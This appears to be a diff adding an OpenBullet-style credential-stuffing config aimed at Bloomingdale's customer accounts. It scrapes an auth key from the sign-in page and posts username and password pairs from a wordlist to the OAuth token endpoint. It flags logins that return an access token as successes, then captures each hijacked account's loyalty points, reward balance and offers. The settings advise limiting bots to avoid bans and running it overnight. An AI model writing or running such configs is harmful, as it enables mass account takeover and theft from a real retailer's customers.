@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "Bloomindales",
+  "SuggestedBots": 3,
+  "LastModified": "2018-06-16T19:10:05.4717521+00:00",
+  "AdditionalInfo": "NO MORE THAN 3 BOTS, YOU HAVE BEEN WARNED, 3 BOTS or BAN, YOU DECIDE. (leave overnight)",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_KEY_(GET) REQUEST GET "https://www.bloomingdales.com/account/signin?cm_sp=NAVIGATION-_-TOP_NAV-_-MY_ACCOUNT-n-n" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_authwebkey PARSE "<SOURCE>" LR "authwebKey: '" "'," Recursive=FALSE -> VAR "AUTHWEBKEY" "" "" 
+#REQUEST_LOGIN_(POST) REQUEST POST "https://auth.bloomingdales.com/v3/oauth2/token" AutoRedirect=TRUE 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>&registrySignIn=false&request_url=https%3A%2F%2Fwww.bloomingdales.com%2Faccount%2Fsignin&deviceFingerPrint=&authWebKey=<AUTHWEBKEY>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.bloomingdales.com/account/signin?cm_sp=NAVIGATION-_-TOP_NAV-_-MY_ACCOUNT-n-n" 
+  HEADER "Origin: https://www.bloomingdales.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+REQUEST GET "https://www.bloomingdales.com/account-xapi/api/myaccount/user/2468849867?cardType=Wallet%2COrderHistory%2CWishList%2CLoyalty%2CRegistry" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.bloomingdales.com/myaccount/home" 
+#totalAvailablePoints PARSE "<SOURCE>" JSON "totalAvailablePoints" Recursive=FALSE -> CAP "totalAvailablePoints" "" "" 
+#PARSE_rewardBalance PARSE "<SOURCE>" JSON "rewardBalance" Recursive=FALSE -> CAP "rewardBalance" "" "" 
+#PARSE_count PARSE "<SOURCE>" JSON "count" Recursive=FALSE -> CAP "OffersAvailable" "" "" 
